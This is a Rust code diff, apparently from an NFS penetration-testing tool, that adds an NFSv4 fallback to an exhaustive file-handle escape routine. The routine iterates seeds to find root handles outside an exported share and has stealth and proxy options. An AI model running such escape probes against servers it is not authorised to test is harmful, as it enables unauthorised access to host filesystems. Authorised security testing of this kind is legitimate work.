@@ -206,6 +206,7 @@ struct AllEscapeResult {
 /// Unlike `run_inner` (first-success-wins), this mode is exhaustive: it tests
 /// every seed against the full escape algorithm and collects all verified root
 /// handles. Useful for mapping the full attack surface of an export.
+#[expect(clippy::cognitive_complexity, reason = "multi-phase escape cascade: v3 -> v2 -> v4 -> LOOKUPP, each with seed iteration")]
 async fn run_all(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32, globals: &GlobalOpts) -> anyhow::Result<()> {
     use std::collections::HashSet;
 
@@ -303,6 +304,41 @@ async fn run_all(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u3
             eprintln!("{}", crate::output::status_info(&format!("Testing seed from {} (v2 probe) ...", seed.source)));
 
             let hits = find_escape_root_all(&v2_probe, seed.handle.as_bytes(), &config).await;
+            for hit in hits {
+                if seen_root_bytes.insert(hit.root_handle.as_bytes().to_vec()) {
+                    all_results.push(AllEscapeResult { candidate: hit, seed_source: seed.source.clone() });
+                }
+            }
+        }
+    }
+
+    // --- If v3 and v2 both found nothing, retry via NFSv4 probe ---
+    // v4-only servers have no v3 or v2 -- the Nfs4EscapeProbe speaks
+    // the right protocol for servers that only expose port 2049/v4.
+    if all_results.is_empty() {
+        let v4_client = {
+            use crate::proto::nfs4::Nfs4Client as PooledNfs4Client;
+            let pool = std::sync::Arc::new(match &globals.proxy {
+                Some(p) => ConnectionPool::with_proxy(p.clone()),
+                None => ConnectionPool::default_config(),
+            });
+            let circuit = std::sync::Arc::new(CircuitBreaker::default_config());
+            let gids = crate::cli::probe::build_gid_list(globals.gid, &globals.aux_gids);
+            let cred = Credential::Sys(AuthSys::with_groups(globals.uid, globals.gid, &gids, &globals.hostname));
+            let pool_key = PoolKey { host: addr, export: format!("__v4_escape_all__{direct_port}"), uid: globals.uid, gid: globals.gid };
+            let transport = PooledTransport::new_direct(pool, pool_key, circuit, stealth.clone(), cred, ReconnectStrategy::Persistent, direct_port);
+            PooledNfs4Client::new(transport)
+        };
+        let v4_probe = Nfs4EscapeProbe { client: v4_client };
+
+        eprintln!();
+        eprintln!("{}", crate::output::status_info("v3/v2 probes found nothing -- retrying seeds with NFSv4 probe"));
+
+        for seed in &seeds {
+            eprintln!();
+            eprintln!("{}", crate::output::status_info(&format!("Testing seed from {} (v4 probe) ...", seed.source)));
+
+            let hits = find_escape_root_all(&v4_probe, seed.handle.as_bytes(), &config).await;
             for hit in hits {
                 if seen_root_bytes.insert(hit.root_handle.as_bytes().to_vec()) {
                     all_results.push(AllEscapeResult { candidate: hit, seed_source: seed.source.clone() });
